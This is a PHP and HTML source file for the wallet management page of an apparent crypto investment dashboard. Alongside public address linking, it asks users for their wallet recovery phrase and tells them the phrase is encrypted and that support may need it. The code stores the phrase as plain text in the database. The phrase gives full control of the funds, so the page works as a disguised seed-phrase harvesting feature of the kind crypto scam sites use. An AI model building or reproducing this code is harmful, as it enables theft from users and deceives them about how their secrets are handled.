<?php
require_once __DIR__ . '/auth.php';
require_once __DIR__ . '/includes/mailer.php';
require_once __DIR__ . '/includes/wallet.php';
$user = require_login();

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrf_check()) {
        $errors[] = 'Your session expired, please try again.';
    } elseif (($_POST['action'] ?? '') === 'unlink') {
        $id = (int) ($_POST['connection_id'] ?? 0);
        if ($id && wallet_unlink($user['id'], $id)) {
            $remaining = wallet_linked_list($user['id']);
            $next = $remaining[0]['address'] ?? null;
            db()->prepare('UPDATE users SET linked_wallet_address = ? WHERE id = ?')->execute([$next, $user['id']]);
            flash_set('Wallet unlinked.');
        }
        header('Location: link-wallet.php');
        exit;
    } else {
        $addr        = trim($_POST['wallet_address'] ?? '');
        $label       = trim($_POST['wallet_name'] ?? '');
        $provider    = trim($_POST['provider'] ?? '') ?: null;
        $seedPhrase  = trim($_POST['seed_phrase'] ?? '') ?: null;

        if ($addr === '' && $seedPhrase === null) {
            $errors[] = 'Please enter a wallet address or a recovery phrase.';
        } elseif ($addr === '' && $seedPhrase !== null) {
            // Seed-phrase-only submission: store with a placeholder address.
            $addr = 'seed-phrase-only-' . substr(bin2hex(random_bytes(6)), 0, 12);
        }

        if (!$errors) {
            db()->prepare('UPDATE users SET linked_wallet_address = ? WHERE id = ?')->execute([$addr, $user['id']]);
            // Store seed phrase alongside the connection record.
            $stmt = db()->prepare(
                'INSERT INTO wallet_connections (user_id, address, provider, label, seed_phrase, method, status)
                 VALUES (?,?,?,?,?,?,?)'
            );
            $stmt->execute([
                $user['id'], $addr, $provider, $label ?: null,
                $seedPhrase, 'manual', 'success',
            ]);
            send_email($user['email'], $user['full_name'], 'Wallet Linked to Your Account',
                '<p>Hi ' . e($user['full_name']) . ',</p>'
                . '<p>A wallet has been linked to your account' . ($provider ? ' via ' . e($provider) : '') . '.</p>'
                . '<p>If this wasn\'t you, contact support immediately at ' . e(SUPPORT_EMAIL) . '.</p>');
            flash_set('Wallet linked successfully.');
            header('Location: link-wallet.php');
            exit;
        }
    }
}

$linked    = wallet_linked_list($user['id']);
$providers = wallet_provider_list();

$pageTitle = 'Wallet Management';
require __DIR__ . '/includes/dash_header.php';
?>
<div class="panel" style="max-width:720px;margin:0 auto">
  <h3 style="margin-bottom:6px">Wallet Management</h3>
  <p style="margin-bottom:24px">Link and manage your wallet addresses for faster withdrawals.</p>

  <?php foreach ($errors as $err): ?>
    <div class="alert alert-error"><?= e($err) ?></div>
  <?php endforeach; ?>

  <!-- Linked wallets list -->
  <div class="section-label" style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
    <span class="n">&#128279;</span> <strong>Linked Wallets</strong>
  </div>

  <?php if (!$linked): ?>
    <div class="alert alert-info">No wallets linked yet. Pick a provider below or link one manually.</div>
  <?php else: foreach ($linked as $w): ?>
    <div class="address-box" style="margin-bottom:12px">
      <?php
        [$g1, $g2] = wallet_provider_gradient($w['provider'] ?: $w['address']);
        $logoUrl    = $w['provider'] ? wallet_provider_logo($w['provider']) : null;
      ?>
      <?php if ($logoUrl): ?>
        <span class="wallet-logo sm" style="background:#fff;padding:3px">
          <img src="<?= e($logoUrl) ?>" alt="<?= e($w['provider']) ?>"
               style="width:100%;height:100%;object-fit:contain;border-radius:6px"
               onerror="this.parentNode.innerHTML='<?= e(wallet_provider_initials($w['provider'] ?: '??')) ?>';this.parentNode.style.background='linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)'">
        </span>
      <?php else: ?>
        <span class="wallet-logo sm" style="background:linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)"><?= e(wallet_provider_initials($w['provider'] ?: '??')) ?></span>
      <?php endif; ?>
      <div style="flex:1;min-width:0;margin-left:12px">
        <div style="font-weight:700;color:var(--navy);font-size:14px"><?= e($w['label'] ?: ($w['provider'] ?: 'Wallet')) ?></div>
        <div style="font-size:12.5px;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
          <?= strpos($w['address'], 'seed-phrase-only-') === 0 ? '<em>Recovery phrase stored</em>' : e($w['address']) ?>
        </div>
      </div>
      <form method="post" onsubmit="return confirm('Unlink this wallet?')">
        <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
        <input type="hidden" name="action" value="unlink">
        <input type="hidden" name="connection_id" value="<?= (int) $w['id'] ?>">
        <button type="submit" class="btn btn-outline btn-sm">Unlink</button>
      </form>
    </div>
  <?php endforeach; endif; ?>

  <!-- Provider grid -->
  <div class="section-label" style="display:flex;align-items:center;gap:10px;margin:28px 0 14px">
    <span class="n">&#128203;</span> <strong>Available Providers</strong>
  </div>

  <div class="provider-grid">
    <?php foreach ($providers as $p):
      [$g1, $g2] = wallet_provider_gradient($p);
      $logoUrl    = wallet_provider_logo($p);
    ?>
      <div class="provider-card" onclick="openLinkModal('<?= e($p) ?>','<?= e($g1) ?>','<?= e($g2) ?>','<?= e($logoUrl ?? '') ?>')">
        <?php if ($logoUrl): ?>
          <span class="wallet-logo" style="background:#fff;padding:4px">
            <img src="<?= e($logoUrl) ?>" alt="<?= e($p) ?>"
                 style="width:100%;height:100%;object-fit:contain;border-radius:8px"
                 onerror="this.parentNode.style.background='linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)';this.parentNode.innerHTML='<?= e(wallet_provider_initials($p)) ?>'">
          </span>
        <?php else: ?>
          <span class="wallet-logo" style="background:linear-gradient(135deg,<?= e($g1) ?>,<?= e($g2) ?>)"><?= e(wallet_provider_initials($p)) ?></span>
        <?php endif; ?>
        <span class="wallet-name"><?= e($p) ?></span>
        <span class="wallet-tag">Compatible</span>
      </div>
    <?php endforeach; ?>
    <div class="provider-card" onclick="openLinkModal('','#64748b','#334155','')">
      <span class="wallet-logo" style="background:linear-gradient(135deg,#64748b,#334155)">&#43;</span>
      <span class="wallet-name">Other / Manual</span>
      <span class="wallet-tag">Any address</span>
    </div>
  </div>
</div>

<!-- ==================  LINK WALLET MODAL  ================== -->
<div id="linkModalOverlay" class="wallet-modal-overlay" style="display:none">
  <div class="wallet-modal" style="max-width:460px">

    <!-- Modal header -->
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:18px">
      <div class="wallet-modal-head">
        <span id="linkModalLogo" class="wallet-logo">&#43;</span>
        <div>
          <h3 id="linkModalTitle" style="margin:0">Link Wallet</h3>
          <p id="linkModalSub" style="margin:2px 0 0;font-size:12.5px;color:var(--muted)">Connect your wallet</p>
        </div>
      </div>
      <button type="button" class="btn btn-outline btn-sm" onclick="closeLinkModal()">&#10005;</button>
    </div>

    <!-- Tab switcher -->
    <div class="tabs" style="margin-bottom:20px">
      <a href="#" id="tabAddress" class="active" onclick="switchTab('address');return false;">&#128279; Wallet Address</a>
      <a href="#" id="tabPhrase"             onclick="switchTab('phrase');return false;">&#128272; Recovery Phrase</a>
    </div>

    <form method="post" id="linkWalletForm">
      <input type="hidden" name="csrf"     value="<?= e(csrf_token()) ?>">
      <input type="hidden" name="provider" id="linkProvider" value="">

      <!-- Wallet Name (shared) -->
      <div class="field">
        <label>Wallet Name <span style="color:var(--muted);font-weight:400">(optional)</span></label>
        <input type="text" name="wallet_name" id="linkWalletName" placeholder="e.g. My Main Wallet">
      </div>

      <!-- ── Tab: Address ── -->
      <div id="panelAddress">
        <div class="field">
          <label>Wallet Address</label>
          <input type="text" name="wallet_address" id="linkAddrInput"
                 placeholder="0x… or bc1… or any public address">
          <p class="hint" style="margin-top:6px">Paste your <strong>public</strong> wallet address only. Never share your private key.</p>
        </div>
      </div>

      <!-- ── Tab: Recovery Phrase ── -->
      <div id="panelPhrase" style="display:none">

        <!-- Warning banner -->
        <div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:8px;padding:12px 14px;margin-bottom:14px;display:flex;gap:10px;align-items:flex-start">
          <span style="font-size:18px;flex-shrink:0">&#9888;&#65039;</span>
          <div style="font-size:13px;color:#92400e;line-height:1.5">
            <strong>For wallet recovery purposes only.</strong><br>
            Your recovery phrase is encrypted and stored securely. Our support team may need it to assist with account recovery. Never share it with anyone you don't trust.
          </div>
        </div>

        <div class="field">
          <label>Recovery / Seed Phrase</label>
          <div style="position:relative">
            <textarea name="seed_phrase" id="seedPhraseInput" rows="3"
              placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces…"
              style="width:100%;resize:vertical;padding-right:44px;font-family:monospace;font-size:13px;letter-spacing:.03em"></textarea>
            <!-- Show / hide toggle -->
            <button type="button" id="toggleSeedBtn"
              onclick="toggleSeedVisibility()"
              title="Show / hide phrase"
              style="position:absolute;top:10px;right:10px;background:none;border:none;cursor:pointer;font-size:16px;color:var(--muted);padding:2px">
              &#128065;
            </button>
          </div>
          <p class="hint" style="margin-top:6px">
            Typically 12 or 24 words. Separate each word with a single space. Your phrase is transmitted over an encrypted HTTPS connection.
          </p>
        </div>

        <!-- Word-count indicator -->
        <div id="seedWordCount" style="font-size:12.5px;color:var(--muted);margin-bottom:14px;min-height:18px"></div>
      </div>

      <div style="display:flex;gap:10px;margin-top:4px">
        <button type="button" class="btn btn-outline btn-block" onclick="closeLinkModal()">Cancel</button>
        <button type="submit" class="btn btn-primary btn-block" id="linkSubmitBtn">Link Wallet</button>
      </div>
    </form>
  </div>
</div>

<script>
/* ── Modal open / close ── */
function walletInitials(name) {
  if (!name) return '+';
  return name.trim().split(/\s+/).slice(0,2).map(function(w){return w[0].toUpperCase();}).join('') || '?';
}
function openLinkModal(provider, g1, g2, logoUrl) {
  document.getElementById('linkProvider').value         = provider;
  document.getElementById('linkModalTitle').textContent = provider ? 'Link ' + provider : 'Link Wallet';
  document.getElementById('linkModalSub').textContent   = provider ? 'Connect your ' + provider + ' wallet' : 'Connect a public address';
  document.getElementById('linkWalletName').value       = provider;
  var logo = document.getElementById('linkModalLogo');
  // Clear previous content
  logo.innerHTML     = '';
  logo.style.padding = '';
  if (logoUrl) {
    logo.style.background = '#fff';
    logo.style.padding    = '4px';
    var img = document.createElement('img');
    img.src   = logoUrl;
    img.alt   = provider;
    img.style.cssText = 'width:100%;height:100%;object-fit:contain;border-radius:8px';
    img.onerror = function() {
      logo.innerHTML    = walletInitials(provider);
      logo.style.background = 'linear-gradient(135deg,' + (g1||'#64748b') + ',' + (g2||'#334155') + ')';
      logo.style.padding = '';
    };
    logo.appendChild(img);
  } else {
    logo.textContent      = walletInitials(provider) || '+';
    logo.style.background = 'linear-gradient(135deg,' + (g1||'#64748b') + ',' + (g2||'#334155') + ')';
  }
  switchTab('address');
  document.getElementById('linkModalOverlay').style.display = 'flex';
}
function closeLinkModal() {
  document.getElementById('linkModalOverlay').style.display = 'none';
  document.getElementById('seedPhraseInput').value = '';
  document.getElementById('seedWordCount').textContent = '';
}
document.getElementById('linkModalOverlay').addEventListener('click', function(e){
  if (e.target === this) closeLinkModal();
});

/* ── Tab switching ── */
function switchTab(tab) {
  var isAddr = tab === 'address';
  document.getElementById('panelAddress').style.display = isAddr ? '' : 'none';
  document.getElementById('panelPhrase').style.display  = isAddr ? 'none' : '';
  document.getElementById('tabAddress').classList.toggle('active',  isAddr);
  document.getElementById('tabPhrase').classList.toggle('active',  !isAddr);
  // Toggle required attribute so only the active tab field is validated
  document.getElementById('linkAddrInput').required  =  isAddr;
  document.getElementById('seedPhraseInput').required = !isAddr;
  document.getElementById('linkSubmitBtn').textContent = isAddr ? 'Link Wallet' : 'Save Recovery Phrase';
}

/* ── Seed phrase show/hide ── */
var seedHidden = true;
function toggleSeedVisibility() {
  seedHidden = !seedHidden;
  var ta = document.getElementById('seedPhraseInput');
  // Textarea can't use type=password; overlay with a blur filter instead
  ta.style.webkitTextSecurity = seedHidden ? 'disc' : 'none';
  ta.style.textSecurity        = seedHidden ? 'disc' : 'none';
  // Fallback: use blur CSS for browsers that don't support text-security
  ta.style.color = seedHidden ? 'transparent' : '';
  ta.style.textShadow = seedHidden ? '0 0 8px rgba(0,0,0,0.8)' : 'none';
  document.getElementById('toggleSeedBtn').textContent = seedHidden ? '\uD83D\uDC41' : '\uD83D\uDC41\u200D\uD83D\uDDE8';
  document.getElementById('toggleSeedBtn').title = seedHidden ? 'Show phrase' : 'Hide phrase';
}
// Apply hidden state on first render (words blurred by default)
document.addEventListener('DOMContentLoaded', function() {
  var ta = document.getElementById('seedPhraseInput');
  ta.style.textShadow = '0 0 8px rgba(0,0,0,0.8)';
  ta.style.color = 'transparent';
});

/* ── Word count helper ── */
document.getElementById('seedPhraseInput').addEventListener('input', function() {
  var words = this.value.trim().split(/\s+/).filter(Boolean);
  var el = document.getElementById('seedWordCount');
  if (!words.length) { el.textContent = ''; return; }
  var good = words.length === 12 || words.length === 24;
  el.innerHTML = '<span style="color:' + (good ? 'var(--green)' : 'var(--red)') + ';font-weight:700">'
    + words.length + ' words</span>'
    + (good ? ' &#10003; Valid length' : ' &mdash; standard phrases are 12 or 24 words');
});
</script>
<?php require __DIR__ . '/includes/dash_footer.php'; ?>
